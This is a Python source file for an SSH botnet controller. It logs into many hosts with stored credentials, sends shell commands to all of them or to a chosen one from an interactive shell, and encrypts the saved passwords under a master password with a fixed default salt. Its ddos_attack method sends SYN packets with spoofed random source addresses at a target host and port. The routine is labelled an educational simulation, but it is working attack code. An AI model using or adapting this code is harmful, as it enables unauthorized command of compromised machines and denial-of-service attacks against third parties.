from pexpect import pxssh
import json
import os
import base64
import hashlib
from cryptography.fernet import Fernet
import getpass
from scapy.all import IP, TCP, RandIP, RandShort, send, Raw
import time
import random


class Bot:
    def __init__(self, host, username, password):
        self.host = host
        self.username = username
        self.password = password
        self.session = None
        self.connected = False
        self.name = f"{username}@{host}"

    def connect(self):
        try:
            self.session = pxssh.pxssh()
            self.session.login(self.host, self.username,
                               self.password, auto_prompt_reset=True)
            self.connected = True
            print(f"[+] Connection established with {self.name}")
            return True
        except Exception as e:
            print(f"[-] Connection failed to {self.name}: {str(e)}")
            self.connected = False
            return False

    def send_command(self, command):
        if not self.connected or not self.session:
            print(f"[-] Bot {self.name} is not connected.")
            return None

        try:
            self.session.sendline(command)
            self.session.prompt()
            output = self.session.before.decode('utf-8').strip()

            return output

        except Exception as e:
            print(f"[-] Failed to execute command on {self.name}: {str(e)}")
            self.connected = False
            return None

    def is_connected(self):
        if not self.session:
            return False

        try:
            self.session.sendline('echo "Connection check"')
            self.session.prompt()
            return True
        except:
            self.connected = False
            return False

    def reconnect(self):
        if self.is_connected():
            return True

        print(f"[*] Attempting to reconnect to {self.name}...")
        return self.connect()

    def close(self):
        if self.session:
            try:
                self.session.logout()
            except:
                pass
            finally:
                self.session = None
                self.connected = False
                print(f"[+] Connection to {self.name} closed.")


def generate_key_from_password(password, salt=None):
    """Generate a Fernet key from a password and salt."""
    if salt is None:
        salt = b'botnet_salt'  # Default salt - in production use a secure random salt

    # Derive a key using PBKDF2
    kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    # Fernet requires 32 url-safe base64-encoded bytes
    key = base64.urlsafe_b64encode(kdf[:32])
    return key


def encrypt_password(password, key):
    """Encrypt a password using Fernet symmetric encryption."""
    f = Fernet(key)
    return f.encrypt(password.encode()).decode()


def decrypt_password(encrypted_password, key):
    """Decrypt a password using Fernet symmetric encryption."""
    f = Fernet(key)
    return f.decrypt(encrypted_password.encode()).decode()


class Botnet():
    def __init__(self):
        self.bots = []
        self.botnet_file = os.path.join(
            os.path.dirname(__file__), 'botnet.json')

    def add_bot(self, host, username, password):
        for bot in self.bots:
            if bot.host == host and bot.username == username:
                print(
                    f"[!] Bot {username}@{host} already exists in the botnet.")
                return False

        new_bot = Bot(host, username, password)

        if new_bot.connect():
            self.bots.append(new_bot)
            print(f"[+] Bot {username}@{host} added to the botnet.")
            return True
        else:
            print(f"[-] Failed to add bot {username}@{host}.")
            return False

    def list_bots(self):
        if not self.bots:
            print("[!] No bots in the botnet.")
            return

        print("\n=== Botnet Status ===")
        print(f"Total Bots: {len(self.bots)}")
        print("-" * 40)
        for i, bot in enumerate(self.bots, 1):
            status = "Connected" if bot.is_connected() else "Disconnected"
            print(f"{i}. {bot.name} - {status}")
        print("-" * 40)

    def command_all(self, command):
        if not self.bots:
            print(f"[!] No bots in the botnet.")
            return

        print(f"[+] Executing command on all bots: {command}")
        print('-' * 50)

        results = {}

        for bot in self.bots:
            if bot.is_connected() or bot.reconnect():
                output = bot.send_command(command)
                results[bot.name] = output
                print(f"\n=== Output from {bot.name} ===")
                print(output if output else "No output")
            else:
                results[bot.name] = "Not connected"
                print(f"\n=== {bot.name} ===")
                print("Not connected")

        return results

    def ddos_attack(self, target_ip, target_port, duration=10, packet_size=64, verbose=True):
        if not self.bots:
            print("[!] No bots in the botnet to perform the attack.")
            return False

        connected_bots = [
            bot for bot in self.bots if bot.is_connected() or bot.reconnect()]

        if not connected_bots:
            print("[!] No connected bots available for the attack.")
            return False

        print("\n[!] EDUCATIONAL WARNING [!]")
        print("This is a simulation for educational purposes only.")
        print("Performing DDoS attacks against real targets without explicit permission is illegal.")
        print("This simulation will create a controlled and limited traffic only.")
        print("-" * 60)

        confirm = input(
            "Do you understand and wish to proceed with the simulation? (yes/no): ")
        if confirm.lower() not in ('yes', 'y'):
            print("[+] DDoS simulation cancelled.")
            return False

        print(
            f"\n[*] Starting DDoS simulation against {target_ip}:{target_port}")
        print(f"[*] Using {len(connected_bots)} bot(s) for {duration} seconds")

        start_time = time.time()
        end_time = start_time + duration
        packet_count = 0

        payload = Raw(b"X" * packet_size)

        try:
            print("[*] Instructing bots to send packets...")

            while time.time() < end_time:
                Randbot = random.choice(connected_bots)

                packet = IP(src=RandIP(), dst=target_ip) / \
                    TCP(sport=RandShort(), dport=int(target_port), flags="S") / \
                    payload

                send(packet, verbose=0)
                packet_count += 1

                if verbose and packet_count % 10 == 0:
                    elapsed = time.time() - start_time
                    print(
                        f"[*] Sent {packet_count} packets in {elapsed:.1f} seconds.")

                time.sleep(0.1)

        except KeyboardInterrupt:
            print("\n[!] Attack simulation manually stopped")

        except Exception as e:
            print(f"\n[!] Error during simulation: {str(e)}")

        finally:
            total_time = time.time() - start_time
            print("\n=== DDoS Simulation Results ===")
            print(f"Target: {target_ip}:{target_port}")
            print(f"Duration: {total_time:.2f} seconds")
            print(f"Packets sent: {packet_count}")
            print(f"Rate: {packet_count/total_time:.2f} packets/second")
            print(
                f"Total data sent: {(packet_count * packet_size)/1024:.2f} KB")
            print(
                "\n[!] Remember: This was a heavily rate-limited educational simulation.")
            print("    A real attack would be thousands of times more intensive.")
            return True

    def interactive_shell(self):
        if not self.bots:
            print("[!] No bots in the botnet.")
            return

        connected_bots = [
            bot for bot in self.bots if bot.is_connected() or bot.reconnect()]
        if not connected_bots:
            print("[!] No connected bots available.")
            return

        print("\n=== Interactive Botnet Shell ===")
        print(f"Connected bots: {len(connected_bots)}")
        print("Special commands:")
        print("  'list' - List all connected bots")
        print("  'select X' - Select bot number X for individual commands")
        print("  'all' - Send commands to all bots (default)")
        print("  'exit' or 'quit' - Return to main menu")
        print("-" * 50)

        # Default to all bots
        target_bot = None
        target_mode = "all"

        while True:
            try:
                # Show the appropriate prompt
                if target_mode == "single" and target_bot:
                    prompt = f"\nBotnet[{target_bot.name}]> "
                else:
                    prompt = "\nBotnet[ALL]> "

                command = input(prompt)

                # Process special commands
                if command.lower() in ['exit', 'quit']:
                    break

                elif command.lower() == 'list':
                    print("\n=== Connected Bots ===")
                    for i, bot in enumerate(connected_bots, 1):
                        print(f"{i}. {bot.name}")
                    continue

                elif command.lower().startswith('select '):
                    try:
                        bot_index = int(command.split()[1]) - 1
                        if 0 <= bot_index < len(connected_bots):
                            target_bot = connected_bots[bot_index]
                            target_mode = "single"
                            print(f"[+] Now targeting {target_bot.name}")
                        else:
                            print(
                                f"[-] Invalid bot number. Use 1-{len(connected_bots)}")
                    except (ValueError, IndexError):
                        print(
                            "[-] Invalid selection format. Use 'select X' where X is the bot number.")
                    continue

                elif command.lower() == 'all':
                    target_mode = "all"
                    target_bot = None
                    print("[+] Now targeting all bots")
                    continue

                # Execute the command
                if command.strip():
                    if target_mode == "single" and target_bot:
                        # Execute on single bot
                        output = target_bot.send_command(command)
                        print(f"\n=== Output from {target_bot.name} ===")
                        print(output if output else "No output")
                    else:
                        # Execute on all bots
                        self.command_all(command)

            except KeyboardInterrupt:
                print("\n[!] Interactive shell terminated.")
                break

    def save_botnet(self, master_password=None):
        if not self.bots:
            print("[!] No bots to save.")
            return False

        # Get the master password if not provided
        if master_password is None:
            master_password = getpass.getpass(
                "[?] Enter master password for encryption: ")

        # Generate encryption key from master password
        key = generate_key_from_password(master_password)

        bot_data = []
        for bot in self.bots:
            # Encrypt the bot's password
            encrypted_password = encrypt_password(bot.password, key)

            bot_data.append({
                'host': bot.host,
                'username': bot.username,
                'password': encrypted_password  # Store encrypted password
            })

        try:
            with open(self.botnet_file, 'w') as f:
                json.dump(bot_data, f)
            print(
                f"[+] Botnet saved to {self.botnet_file} with encrypted passwords")
            return True
        except Exception as e:
            print(f"[-] Failed to save botnet: {str(e)}")
            return False

    def load_botnet(self, master_password=None):
        """Load botnet information from the JSON file and decrypt passwords."""
        if not os.path.exists(self.botnet_file):
            print(f"[!] Botnet file {self.botnet_file} not found.")
            return False

        # Get the master password if not provided
        if master_password is None:
            master_password = getpass.getpass(
                "[?] Enter master password for decryption: ")

        # Generate decryption key from master password
        key = generate_key_from_password(master_password)

        try:
            with open(self.botnet_file, 'r') as f:
                bot_data = json.load(f)

            # Close existing connections
            self.close_all()
            self.bots = []

            # Connect to all bots in the file, decrypting passwords
            successful_connections = 0
            for data in bot_data:
                try:
                    # Decrypt the password
                    decrypted_password = decrypt_password(
                        data['password'], key)

                    if self.add_bot(data['host'], data['username'], decrypted_password):
                        successful_connections += 1
                except Exception as e:
                    print(
                        f"[-] Failed to decrypt or connect to {data['username']}@{data['host']}: {str(e)}")

            print(
                f"[+] Loaded {successful_connections} bots out of {len(bot_data)}")
            return successful_connections > 0
        except Exception as e:
            print(f"[-] Failed to load botnet: {str(e)}")
            return False

    def remove_bot(self, index):
        """Remove a bot from the botnet by index."""
        if not self.bots or index < 0 or index >= len(self.bots):
            print("[!] Invalid bot index.")
            return False

        bot = self.bots[index]
        bot.close()
        self.bots.pop(index)
        print(f"[+] Bot {bot.name} removed from the botnet.")
        return True

    def close_all(self):
        """Close all connections."""
        for bot in self.bots:
            bot.close()
        print("[+] All connections closed.")
